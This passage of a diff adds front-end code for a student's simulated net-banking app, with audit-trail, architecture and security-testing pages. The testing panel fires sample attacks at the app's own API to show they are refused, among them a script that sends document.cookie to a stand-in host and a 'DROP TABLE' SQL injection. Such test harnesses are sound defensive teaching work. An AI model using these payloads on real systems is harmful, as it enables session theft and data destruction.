+  document.querySelectorAll("[data-rj]").forEach(b => b.onclick = () => act(b.dataset.rj, "reject"));
+}
+async function customersPage(){
+  const r = await Bank.users(S.sid); if (!await ok(r)) return;
+  shell(`<h1>Customers</h1><div class="card tw"><table><thead><tr><th>Name</th><th>Role</th><th>Last sign-in</th><th>Failed tries</th><th>Access</th><th></th></tr></thead><tbody>
+    ${r.data.map(u => `<tr><td>${esc(u.name)} <span class="mono muted">${esc(u.id)}</span></td><td>${esc(u.role)}</td><td>${u.lastLogin ? when(u.lastLogin) : "–"}</td><td class="num">${u.failed}</td>
+      <td>${u.locked ? '<span class="tag t-bad">Locked</span>' : '<span class="tag t-ok">Open</span>'}</td><td>${u.locked ? `<button class="btn alt sm" data-ul="${esc(u.id)}">Unlock</button>` : ""}</td></tr>`).join("")}
+  </tbody></table></div><p class="muted small">Enter a wrong password ${CONFIG.LOCKOUT_THRESHOLD} times for any customer to see the lock appear here.</p>`);
+  document.querySelectorAll("[data-ul]").forEach(b => b.onclick = async () => { const x = await Bank.unlock(S.sid, b.dataset.ul, S.csrf); if (await ok(x)) customersPage(); });
+}
+async function auditPage(){
+  const r = await Bank.trail(S.sid); if (!await ok(r)) return;
+  shell(`<div class="row between"><h1>Audit trail</h1><div class="row"><button class="btn sm" id="chk">Verify integrity</button><button class="btn bad sm" id="alt">Alter an entry (insider test)</button></div></div>
+    <div id="cr"></div>
+    <p class="muted small">Every entry contains the SHA-256 hash of the entry before it. Changing or deleting any row breaks every hash after it. Passwords, OTPs and PINs are never written here, and account numbers are masked.</p>
+    <div class="card tw" style="padding:8px 14px"><table><thead><tr><th>#</th><th>Time</th><th>User</th><th>Event</th><th>Result</th><th>Detail</th><th>Hash</th></tr></thead><tbody>
+    ${r.data.map(e => `<tr><td class="num">${e.seq}</td><td class="num" style="white-space:nowrap">${when(e.ts)}</td><td class="mono">${esc(e.actor)}</td><td class="mono small">${esc(e.event)}</td>
+      <td><span class="tag ${e.outcome === "ok" || e.outcome === "info" ? "t-ok" : e.outcome === "denied" ? "t-warn" : "t-bad"}">${esc(e.outcome)}</span></td><td class="small">${esc(e.detail)}</td><td class="mono muted small">${esc(e.hash.slice(0, 10))}</td></tr>`).join("")}
+    </tbody></table></div>`);
+  $("chk").onclick = async () => { const x = await Bank.verifyTrail(S.sid); if (!await ok(x)) return; $("cr").innerHTML = x.data.ok ? `<div class="note ok">All ${x.data.count} entries verified. The trail has not been altered.</div>` : `<div class="note bad">Entry #${x.data.at} has been altered. Entries from #${x.data.at} onward cannot be trusted.</div>`; };
+  $("alt").onclick = () => { const n = Bank.insiderEdit(); $("cr").innerHTML = `<div class="note warn">Entry #${n} was changed directly in the database. Now press Verify integrity.</div>`; };
+}
+
+/* ---------- security testing ---------- */
+const TESTS = [
+  {id: "tamper", who: "customer", t: "Change the amount after review", d: "Intercept the reviewed payment and raise the amount to ₹1,99,999 before submitting it.",
+    run: async () => { const q = S.review?.q || S.lastPaid; if (!q) return {k: "warn", t: "Review a payment under Pay & transfer first."}; return out(await Bank.pay(S.sid, {...q, amount: 19999900}, "0000", S.csrf)); }},
+  {id: "replay", who: "customer", t: "Replay a completed payment", d: "Submit the same signed payment again after it has gone through.",
+    run: async () => S.lastPaid ? out(await Bank.pay(S.sid, S.lastPaid, "0000", S.csrf)) : {k: "warn", t: "Complete one payment first."}},
+  {id: "idor", who: "customer", t: "Open another customer's account", d: "Request /accounts/S2/transactions (Priya's account) while signed in as Aditya.",
+    run: async () => out(await Bank.statement(S.sid, S.user.id === "priya" ? "S1" : "S2"))},
+  {id: "cooling", who: "customer", t: "Pay a payee during cooling", d: "Send money to a payee added less than a minute ago.",
+    run: async () => { const p = await Bank.payees(S.sid); const c = p.data?.find(x => x.activeAt > Date.now()); if (!c) return {k: "warn", t: "Add a new payee first, then run this within a minute."}; const o = await Bank.overview(S.sid); return out(await Bank.quote(S.sid, {from: o.data.accounts[0].id, to: c.id, amount: "100", remark: ""}, S.csrf)); }},
+  {id: "self", who: "customer", t: "Approve your own large payment", d: "Call the officer approval endpoint with a customer session.",
+    run: async () => out(await Bank.decide(S.sid, "VT00000", "approve", "looks fine", S.csrf))},
+  {id: "csrf", who: "any", t: "Forged request from another site", d: "Add a payee from a malicious page: the browser sends the session, but not the anti-forgery token.",
+    run: async () => out(await Bank.payeeStart(S.sid, {name: "Quick Loans", accno: "999999999999", ifsc: "FAKE0000001"}, "not-the-token"))},
+  {id: "xss", who: "customer", t: "Script in the remarks field", d: "Use <script>fetch('//evil.example?c='+document.cookie)<\/script> as the remark.",
+    run: async () => { const o = await Bank.overview(S.sid); return out(await Bank.quote(S.sid, {from: o.data.accounts[0].id, to: o.data.accounts[1]?.id || o.data.accounts[0].id, amount: "10", remark: "<script>fetch('//evil.example?c='+document.cookie)<\/script>"}, S.csrf)); }},
+  {id: "sqli", who: "customer", t: "SQL injection in payee name", d: "Add a payee named Robert'); DROP TABLE accounts;--",
+    run: async () => out(await Bank.payeeStart(S.sid, {name: "Robert'); DROP TABLE accounts;--", accno: "123456789", ifsc: "VTRB0002417"}, S.csrf))},
+  {id: "hijack", who: "any", t: "Guessed session ID", d: "Call the API with a random session ID instead of the real one.",
+    run: async () => out(await Bank.payees(randHex(16)))},
+  {id: "error", who: "any", t: "Trigger a server error", d: "Request a report whose code has a bug. The user must see no stack trace.",
+    run: async () => out(await Bank.report(S.sid))}
+];
+const out = r => r.status === 200 ? {k: "warn", t: "200 OK: the request was accepted."} : {k: "ok", t: `${r.status >= 500 ? "Handled safely" : "Refused"} (${r.status}): ${r.error}`};
+function testsPage(){
+  const list = TESTS.filter(t => t.who === "any" || t.who === S.user.role);
+  shell(`<div class="stack" style="max-width:70ch"><h1>Security testing</h1><p class="muted">Each test sends a malicious request straight to the banking API, the way a tester with an intercepting proxy would. The panel on the right lists every API call with its HTTP status.</p></div>
+    <div class="tests"><div class="card">${list.map(t => `<div class="test"><h3>${esc(t.t)}</h3><button class="btn alt sm" data-run="${t.id}">Run test</button><p>${esc(t.d)}</p><div class="out" id="o-${t.id}">${S.results[t.id] ? `<div class="note ${S.results[t.id].k}">${esc(S.results[t.id].t)}</div>` : ""}</div></div>`).join("")}</div>
+    <div class="card"><div class="row between"><h2>API calls</h2><span class="muted small">latest first</span></div><div class="log" id="log"></div></div></div>`);
+  document.querySelectorAll("[data-run]").forEach(b => b.onclick = async () => {
+    b.disabled = true; const t = TESTS.find(x => x.id === b.dataset.run); const res = await t.run(); b.disabled = false;
+    if (!S.sid) return; S.results[t.id] = res; const el = $("o-" + t.id); if (el) el.innerHTML = `<div class="note ${res.k}">${esc(res.t)}</div>`;
+  });
+  logDraw();
+}
+function logDraw(){
+  const el = $("log"); if (!el) return; const rq = Bank.requests();
+  el.innerHTML = rq.length ? rq.map(q => `<div><span class="code c${String(q.status)[0]}">${q.status}</span><span class="p">${esc(q.method)} ${esc(q.path)}</span><span class="muted">${q.ms} ms</span>${q.note ? `<span class="n">${esc(q.note)}</span>` : ""}</div>`).join("") : `<p class="muted">No calls yet.</p>`;
+}
+Bank.subscribe(logDraw);
+
+/* ---------- architecture ---------- */
+function archHtml(){
+  const M = [
+    ["Architecture", "Database reachable from the internet; one compromised tier exposes everything", "Interface talks only to the API layer; every rule is enforced behind it", "CDN/WAF → load balancer → web tier → app tier → database in a private subnet, firewalled between tiers"],
+    ["Deployment", "Unpatched servers, leaked secrets, untested releases", "Static build served over HTTPS from an isolated origin", "CI/CD with SAST, dependency and secret scanning, DAST on UAT, signed images, blue-green release"],
+    ["Input validation", "SQL injection, XSS, malformed data", "Allow-list patterns on the server for Customer ID, amount, IFSC, account number, remarks and reasons; all output HTML-encoded", "Same rules, parameterised queries, Content-Security-Policy"],
+    ["Authentication", "Phishing, brute force, credential stuffing", "Personal phrase before password, PBKDF2 hashing with salt, shuffled on-screen keyboard, OTP, lockout after 5 failures, identical errors and timing for unknown IDs", "Argon2id, device binding, risk-based checks, passkeys"],
+    ["Authorization", "IDOR, privilege escalation, insider fraud", "Role check and account-ownership check on every call; maker-checker approval above ₹50,000; officers cannot approve their own payments", "Central policy engine, least privilege, periodic access reviews"],
+    ["Configuration management", "Debug mode, weak defaults, drift", "All limits and timeouts in one frozen configuration; debug off", "CIS-hardened images, infrastructure as code, security headers (HSTS, CSP, X-Frame-Options, nosniff)"],
+    ["Sensitive data", "Account numbers or credentials exposed", "Account numbers AES-256-GCM encrypted at rest, masked on screen, reveal logged and auto-hidden; nothing secret kept in browser storage", "Data classification, tokenisation, DLP, RBI data-localisation"],
+    ["Session management", "Hijacking, fixation, abandoned sessions", "128-bit random ID created only after OTP; 3-minute idle and 15-minute absolute limit; server-side sign-out; last sign-in shown", "__Host- cookie with Secure, HttpOnly, SameSite=Strict; shared session store"],
+    ["Cryptography", "Weak or home-made algorithms", "Web Crypto only: AES-GCM, HMAC-SHA256, SHA-256, PBKDF2, secure random numbers", "TLS 1.3, keys in an HSM/KMS with rotation"],
+    ["Parameter manipulation", "Amount or payee changed in transit; replay", "Reviewed payment is HMAC-signed with a nonce and expiry; any change, replay or late submit is refused; transaction PIN required", "Same, plus device-based transaction signing"],
+    ["Exception management", "Stack traces leak internals", "One handler returns a plain message with an incident reference; details go only to the audit trail", "Central error handling, alerting on error spikes"],
+    ["Auditing & logging", "Attacks go unnoticed; users deny actions", "Every sign-in, failure, lock, refusal, payment and approval written to a SHA-256 hash chain that officers can verify", "Ship to SIEM, write-once storage, 24×7 monitoring"]
+  ];
+  return `<div class="stack" style="max-width:72ch"><div class="eyebrow">Assignment 4 · Design and deployment of a secure web application</div><h1>Vittora Net Banking: architecture and security controls</h1>
+    <p><strong>Scenario.</strong> Vittora Net Banking lets retail customers check balances and transactions, manage payees and send money. Bank officers approve large payments, unlock customers and review the audit trail. Each security principle in the brief is applied in the working application.</p>
+    <p class="muted small">Aditya Pradhan · 23108A0010 · EXCS A</p></div>
+    <section class="stack"><h2>Proposed architecture</h2><div class="card"><div class="flow" role="img" aria-label="Customer browser to CDN and WAF to load balancer to web tier to application tier to core banking database">
+      <div class="node"><span class="eyebrow">Client</span>Customer browser / app</div><div class="arrow">HTTPS TLS 1.3</div>
+      <div class="node"><span class="eyebrow">Edge</span>CDN + WAF + DDoS filter</div><div class="arrow">clean traffic</div>
+      <div class="node"><span class="eyebrow">DMZ</span>Load balancer</div><div class="arrow"></div>
+      <div class="node"><span class="eyebrow">Web tier</span>UI, security headers</div><div class="arrow">internal</div>
+      <div class="node key"><span class="eyebrow">App tier</span>Sign-in + OTP, sessions, roles, payments, approvals</div><div class="arrow">parameterised SQL</div>
+      <div class="node"><span class="eyebrow">Data tier</span>Core banking DB, encrypted, private subnet</div></div>
+      <div class="row" style="margin-top:14px"><span class="eyebrow">App tier also uses</span><span class="pill">Session store</span><span class="pill">HSM / KMS</span><span class="pill">SMS gateway</span><span class="pill">Audit trail → SIEM</span></div></div></section>
+    <section class="stack"><h2>Workflow</h2><div class="cols">
+      <div class="card"><h3>Customer</h3><ul class="list"><li>Customer ID → personal phrase check → password → OTP</li><li>Add payee → OTP → cooling period → payee active</li><li>Payment: details → signed review → transaction PIN → receipt</li><li>Above ₹50,000: money held until an officer approves</li></ul></div>
+      <div class="card"><h3>Bank officer</h3><ul class="list"><li>Approve or reject held payments with a recorded reason</li><li>Unlock customers after repeated failed sign-ins</li><li>Verify that the audit trail has not been altered</li></ul></div></div></section>
+    <section class="stack"><h2>Security principles applied</h2><div class="card tw" style="padding:6px 12px"><table class="matrix"><thead><tr><th>Principle</th><th>Threat</th><th>Implemented in the application</th><th>Production hardening</th></tr></thead><tbody>
+      ${M.map(r => `<tr><td>${r[0]}</td><td>${r[1]}</td><td>${r[2]}</td><td class="muted">${r[3]}</td></tr>`).join("")}</tbody></table></div></section>
+    <section class="cols">
+      <div class="card"><h3>Deployment</h3><ul class="list"><li>Source in Git with protected main branch and reviewed pull requests</li><li>CI: unit tests, SAST, dependency (SCA) and secret scans</li><li>UAT deployment with OWASP ZAP (DAST) scan</li><li>Production release by blue-green switch with one-step rollback</li><li>Served over HTTPS from an isolated origin</li></ul></div>
+      <div class="card"><h3>Response headers</h3><ul class="list mono" style="font-size:.78rem"><li>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</li><li>Content-Security-Policy: default-src 'self'; frame-ancestors 'none'</li><li>X-Content-Type-Options: nosniff</li><li>Referrer-Policy: no-referrer</li><li>Set-Cookie: __Host-SID=…; Secure; HttpOnly; SameSite=Strict; Path=/</li></ul></div></section>
+    <section class="card"><h3>Live configuration</h3><dl class="kv">
+      <dt>Served over HTTPS</dt><dd>${window.isSecureContext ? "Yes (secure context)" : "No"}</dd>
+      <dt>Password hashing</dt><dd>PBKDF2-SHA256, ${CONFIG.PBKDF2_ITERATIONS.toLocaleString("en-IN")} iterations, 16-byte salt</dd>
+      <dt>Lockout</dt><dd>${CONFIG.LOCKOUT_THRESHOLD} failures</dd>
+      <dt>Session limits</dt><dd>${CONFIG.IDLE_TIMEOUT_MS / 60000} min idle, ${CONFIG.ABSOLUTE_TIMEOUT_MS / 60000} min total</dd>
+      <dt>Approval threshold</dt><dd>${inr(CONFIG.APPROVAL_THRESHOLD)}</dd>
+      <dt>Debug mode</dt><dd>${CONFIG.DEBUG ? "On" : "Off"}</dd></dl></section>`;
+}
+function archPage(){
+  if (S.sid) return shell(archHtml());
+  root.innerHTML = `<main style="padding-left:max(16px, env(safe-area-inset-left, 0px));padding-right:max(16px, env(safe-area-inset-right, 0px))"><div class="page" style="margin:0 auto"><div><button class="link" id="bk">← Sign in</button></div>${archHtml()}</div></main>`;
+  $("bk").onclick = () => go("signin");
+}
+
+/* ---------- router ---------- */
+function draw(){
+  const p = S.page;
+  if (p === "arch") return archPage();
+  if (!S.sid) return signinPage();
+  ({home: homePage, statement: statementPage, pay: payPage, payees: payeesPage, approvals: approvalsPage, customers: customersPage, audit: auditPage, tests: testsPage}[p] || homePage)();
+}
+root.innerHTML = `<p style="padding:24px" class="muted">Loading…</p>`;
+Bank.init().then(() => { if (location.hash === "#architecture") S.page = "arch"; draw(); })
+  .catch(() => { root.innerHTML = `<div class="note bad" style="margin:24px">This browser cannot run Vittora Net Banking. Please use a current version of Chrome, Edge, Firefox or Safari.</div>`; });
+</script>
+</body>
+</html>
